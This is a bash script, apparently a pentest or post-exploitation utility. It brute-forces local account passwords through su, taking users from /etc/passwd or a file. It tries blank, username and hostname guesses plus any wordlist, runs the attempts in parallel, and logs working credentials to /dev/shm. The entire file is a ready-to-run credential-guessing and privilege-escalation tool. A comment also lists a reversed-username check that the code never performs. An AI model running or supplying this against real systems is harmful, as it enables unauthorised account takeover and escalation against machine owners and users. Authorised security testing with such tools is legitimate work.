#!/bin/bash

# Test passwords you've gathered for other users on the machine
# Takes in passwords file argument (-p) & optional users file (-u)
# Example: ./su-checker.sh -p passwords.txt -u users.txt
# If no arguments are given, default behavior uses blank password, username as password, and hostname as password for users in /etc/passwd

# Help function
show_help() {
    echo "Usage: $0 [-u user_file] [-p password_file]"
    echo
    echo "Options:"
    echo "  -u user_file       Specify a file containing usernames to test."
    echo "  -p password_file   Specify a file containing passwords to test."
    echo
    echo "Example Commands:"
    echo "  ./su-checker.sh                  # Default: Tests blank password, username as password, and hostname as password."
    echo "  ./su-checker.sh -p passwords.txt # Tests specified passwords for users from /etc/passwd."
    echo "  ./su-checker.sh -p passwords.txt -u users.txt # Tests specified passwords for users from user file."
    exit 0
}

# Default values
users=$(awk -F: '/sh$/{print $1}' /etc/passwd 2>/dev/null)
#users=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
passwords=""

while getopts ":u:p:h" opt; do
  case ${opt} in
    u )
      if [ -f "${OPTARG}" ]; then
        users=$(awk '{$1=$1};1' "${OPTARG}")
      else
        echo "User file ${OPTARG} not found."
        exit 1
      fi
      ;;
    p )
      if [ -f "${OPTARG}" ]; then
        passwords=$(awk '{$1=$1};1' "${OPTARG}")
      else
        echo "Password file ${OPTARG} not found."
        exit 1
      fi
      ;;
    h )
      show_help
      ;;
    \? )
      echo "Invalid option: -$OPTARG" >&2
      show_help
      ;;
    : )
      echo "Option -$OPTARG requires an argument." >&2
      show_help
      ;;
  esac
done


echo "Checking users: $users"

sucheck(){
    user=$1
    pass=$2
    echo "Checking 'echo $pass | su $user'"
    sucheck=$(echo "$pass" | timeout 1 su $user -c whoami 2>/dev/null)
    if [ "$sucheck" ]; then
        echo "You can login as $user using password: $pass"
        echo "$user:$pass" >> /dev/shm/siuuu.txt
    fi
}

export -f sucheck

# Generate password checks for a specific user
generate_checks() {
    local user=$1
    # Default checks: blank, username, hostname, and reversed username
    echo "$user ''"
    echo "$user '$user'"
    echo "$user '$(hostname)'"
    
    # If passwords are provided, generate additional checks
    if [ -n "$passwords" ]; then
        for guess in $passwords; do
            echo "$user '$guess'"
        done
    fi
}

export -f generate_checks

# Use xargs to run checks in parallel
for user in $users; do
    generate_checks "$user" | xargs -n 2 -P 10 bash -c 'sucheck $@' _
done
